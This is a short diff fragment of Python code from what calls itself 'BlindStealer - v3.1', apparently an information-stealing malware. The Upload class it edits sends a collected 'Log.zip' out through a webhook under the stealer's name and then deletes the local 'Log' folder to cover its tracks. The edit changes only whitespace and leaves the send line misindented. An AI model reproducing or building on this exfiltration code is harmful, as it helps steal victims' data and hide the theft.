@@ -66,8 +66,7 @@ class Upload:
                 color=0x24262A,
             ),
             file=File("Log.zip"),
-        )
-        
+        ) 
             self.webhook.send(embed=embed, username="BlindStealer - v3.1", avatar_url="https://i.imgur.com/LNVOaxg.png")
     def clean(self):
         shutil.rmtree("Log")
